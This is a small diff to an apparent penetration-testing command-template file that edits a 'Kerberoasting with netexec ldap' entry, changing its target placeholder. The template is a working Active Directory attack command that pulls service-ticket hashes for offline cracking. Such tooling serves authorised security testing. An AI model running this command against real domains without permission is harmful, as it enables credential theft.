@@ -8,7 +8,7 @@
     {
       "title": "Kerberoasting with netexec ldap",
       "description": "Perform kerberoasting using netexec ldap command.",
-      "template": "netexec ldap {targets} -u {username} -p {password} --kerberoasting kerberoastables.txt --kdcHost {ip}"
+      "template": "netexec ldap {ip} -u {username} -p {password} --kerberoasting kerberoastables.txt --kdcHost {ip}"
     },
     {
       "title": "Kerberoasting using Rubeus.exe",
